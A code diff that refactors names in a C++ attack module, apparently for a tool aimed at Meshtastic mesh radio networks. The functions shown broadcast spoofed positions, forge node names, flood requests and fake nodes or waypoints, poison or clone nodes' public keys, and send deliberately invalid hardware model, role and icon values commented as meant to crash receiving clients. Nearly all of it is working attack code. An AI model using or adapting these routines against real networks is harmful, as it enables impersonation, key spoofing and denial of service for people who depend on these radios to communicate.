@@ -5,7 +5,7 @@
 extern void sendDebugMessage(const std::string& message);
 
 uint32_t TMAttack::getRandomTarget() {
-    auto ret = meshtasticCompact->nodeinfo_db.getRandomNode();
+    auto ret = mtCompact->nodeinfo_db.getRandomNode();
     if (ret) {
         return ret->node_id;
     }
@@ -18,7 +18,7 @@ void TMAttack::atkRndPos() {
     double longitude = min_lon + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lon - min_lon)));
 
     // Create and send the fake position message
-    MC_Position pos_msg = {};
+    MCT_Position pos_msg = {};
     pos_msg.latitude_i = static_cast<int32_t>(latitude * 1e7);
     pos_msg.longitude_i = static_cast<int32_t>(longitude * 1e7);
     pos_msg.altitude = esp_random() % 1000;  // Random altitude
@@ -38,8 +38,8 @@ void TMAttack::atkRndPos() {
         }
     }
     sendDebugMessage("Sending fake position for node 0x" + std::to_string(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
-    meshtasticCompact->SendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
-    meshtasticCompact->SendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
+    mtCompact->sendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
+    mtCompact->sendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
 }
 
 void TMAttack::atkNameChange() {
@@ -51,7 +51,7 @@ void TMAttack::atkNameChange() {
             return;  // no valid target found
         }
     }
-    auto node = meshtasticCompact->nodeinfo_db.get(srcnode);
+    auto node = mtCompact->nodeinfo_db.get(srcnode);
     if (!node) {
         sendDebugMessage("No valid target found for name change attack.");
         return;  // no valid target found
@@ -74,26 +74,26 @@ void TMAttack::atkNameChange() {
         strncpy(node->long_name, new_name.c_str(), 39);
     }
     node->long_name[39] = '\0';
-    meshtasticCompact->SendNodeInfo(*node, 0xffffffff, false);
-    meshtasticCompact->SendNodeInfo(*node, 0xffffffff, false);
+    mtCompact->sendNodeInfo(*node, 0xffffffff, false);
+    mtCompact->sendNodeInfo(*node, 0xffffffff, false);
     sendDebugMessage("Changed longname of node 0x" + std::to_string(srcnode) + " to \"" + node->long_name + "\"");
 }
 
 void TMAttack::atkDdos() {
     uint32_t srcnode = esp_random();
-    meshtasticCompact->SendRequestPositionInfo(0xffffffff, 8, srcnode);
+    mtCompact->sendRequestPositionInfo(0xffffffff, 8, srcnode);
     sendDebugMessage("Sent DDOS msg 1 request from 0x" + std::to_string(srcnode));
     srcnode = getRandomTarget();
     if (srcnode == 0) {
         sendDebugMessage("No valid target found for DDOS 2 attack.");
         return;  // no valid target found
     }
-    MC_NodeInfo* node = meshtasticCompact->nodeinfo_db.get(srcnode);
+    MCT_NodeInfo* node = mtCompact->nodeinfo_db.get(srcnode);
     if (!node) {
         sendDebugMessage("No valid target found for DDOS 2 attack.");
         return;  // no valid target found
     }
-    meshtasticCompact->SendNodeInfo(*node, 0xffffffff, true);
+    mtCompact->sendNodeInfo(*node, 0xffffffff, true);
     sendDebugMessage("Sent DDOS msg 2 from 0x" + std::to_string(srcnode));
 }
 
@@ -106,7 +106,7 @@ void TMAttack::atkPkiPoison() {
             return;  // no valid target found
         }
     }
-    auto node = meshtasticCompact->nodeinfo_db.get(srcnode);
+    auto node = mtCompact->nodeinfo_db.get(srcnode);
     if (!node) {
         sendDebugMessage("No valid target found for PKI poison attack.");
         return;  // no valid target found
@@ -114,8 +114,8 @@ void TMAttack::atkPkiPoison() {
     for (int i = 0; i < 32; i++) {
         node->public_key[i] = esp_random() & 0xff;
     }
-    meshtasticCompact->SendNodeInfo(*node, 0xffffffff, false);
-    meshtasticCompact->SendNodeInfo(*node, 0xffffffff, false);
+    mtCompact->sendNodeInfo(*node, 0xffffffff, false);
+    mtCompact->sendNodeInfo(*node, 0xffffffff, false);
     sendDebugMessage("Sent PKI poison for node 0x" + std::to_string(srcnode));
 }
 
@@ -128,23 +128,23 @@ void TMAttack::atkPkiDupe() {
             return;  // no valid target found
         }
     }
-    auto node = meshtasticCompact->nodeinfo_db.get(srcnode);
+    auto node = mtCompact->nodeinfo_db.get(srcnode);
     if (!node) {
         sendDebugMessage("No valid target found for PKI duplication attack.");
         return;  // no valid target found
     }
     uint32_t dupenodeid = esp_random();
-    MC_NodeInfo nodeinfo = {};  // new node
+    MCT_NodeInfo nodeinfo = {};  // new node
     std::string none = "";
     std::string none2 = "";
     uint8_t hw_model = esp_random() % 105;
-    MeshtasticCompactHelpers::NodeInfoBuilder(&nodeinfo, dupenodeid, none, none2, hw_model);
+    MtCompactHelpers::NodeInfoBuilder(&nodeinfo, dupenodeid, none, none2, hw_model);
     for (int i = 0; i < 32; i++) {
         nodeinfo.public_key[i] = node->public_key[i];  // dupe target key
     }
     nodeinfo.public_key_size = 32;
-    meshtasticCompact->SendNodeInfo(nodeinfo, 0xffffffff, false);
-    meshtasticCompact->SendNodeInfo(nodeinfo, 0xffffffff, false);
+    mtCompact->sendNodeInfo(nodeinfo, 0xffffffff, false);
+    mtCompact->sendNodeInfo(nodeinfo, 0xffffffff, false);
     sendDebugMessage("Sent PKI dupe as node 0x" + std::to_string(srcnode));
 }
 
@@ -154,7 +154,7 @@ void TMAttack::atkRndNode() {
     double longitude = min_lon + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lon - min_lon)));
 
     // Create and send the fake position message
-    MC_Position pos_msg = {};
+    MCT_Position pos_msg = {};
     pos_msg.latitude_i = static_cast<int32_t>(latitude * 1e7);
     pos_msg.longitude_i = static_cast<int32_t>(longitude * 1e7);
     pos_msg.altitude = esp_random() % 1000;  // Random altitude
@@ -169,21 +169,21 @@ void TMAttack::atkRndNode() {
     if (target == 0xffffffff) {
         srcnode = esp_random();
     }
-    MC_NodeInfo nodeinfo = {};
+    MCT_NodeInfo nodeinfo = {};
     std::string none = "";
     std::string none2 = "";
     uint8_t hw_model = esp_random() % 105;
     if (flood_clientcrash == 1) {
         hw_model = 240;  // invalid hw model to crash the client
     }
-    MeshtasticCompactHelpers::NodeInfoBuilder(&nodeinfo, srcnode, none, none2, hw_model);
+    MtCompactHelpers::NodeInfoBuilder(&nodeinfo, srcnode, none, none2, hw_model);
     if (flood_clientcrash == 1) {
         nodeinfo.role = 20;  // invalid role to crash the client
     }
-    meshtasticCompact->SendNodeInfo(nodeinfo, 0xffffffff, false);
-    meshtasticCompact->SendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
-    meshtasticCompact->SendNodeInfo(nodeinfo, 0xffffffff, false);
-    meshtasticCompact->SendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
+    mtCompact->sendNodeInfo(nodeinfo, 0xffffffff, false);
+    mtCompact->sendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
+    mtCompact->sendNodeInfo(nodeinfo, 0xffffffff, false);
+    mtCompact->sendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
     sendDebugMessage("Sent fake node 0x" + std::to_string(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
 }
 
@@ -195,7 +195,7 @@ void TMAttack::atkWaypointFlood() {
     if (srcnode == 0) {
         srcnode = esp_random();
     }
-    MC_Waypoint waypoint = {};
+    MCT_Waypoint waypoint = {};
     uint32_t icon = 0;
     if (flood_clientcrash == 1) {
         icon = esp_random() + 30;  // invalid icon to crash the client
@@ -204,13 +204,13 @@ void TMAttack::atkWaypointFlood() {
     float latitude = min_lat + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lat - min_lat)));
     float longitude = min_lon + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lon - min_lon)));
     uint32_t wpnum = esp_random();
-    MeshtasticCompactHelpers::WaypointBuilder(waypoint, esp_random(), latitude, longitude, "WP-" + std::to_string(wpnum), "WP-" + std::to_string(wpnum), expire, icon);
-    meshtasticCompact->SendWaypointMessage(waypoint, 0xffffffff, 8, srcnode);
+    MtCompactHelpers::WaypointBuilder(waypoint, esp_random(), latitude, longitude, "WP-" + std::to_string(wpnum), "WP-" + std::to_string(wpnum), expire, icon);
+    mtCompact->sendWaypointMessage(waypoint, 0xffffffff, 8, srcnode);
     sendDebugMessage("Sent waypoint from node 0x" + std::to_string(srcnode) + ": lat=" + std::to_string(latitude) + ", lon=" + std::to_string(longitude));
 }
 
 void TMAttack::loop() {
-    if (meshtasticCompact == nullptr) {
+    if (mtCompact == nullptr) {
         return;  // Radio not set
     }
     if (current_attack == AttackType::NONE) {
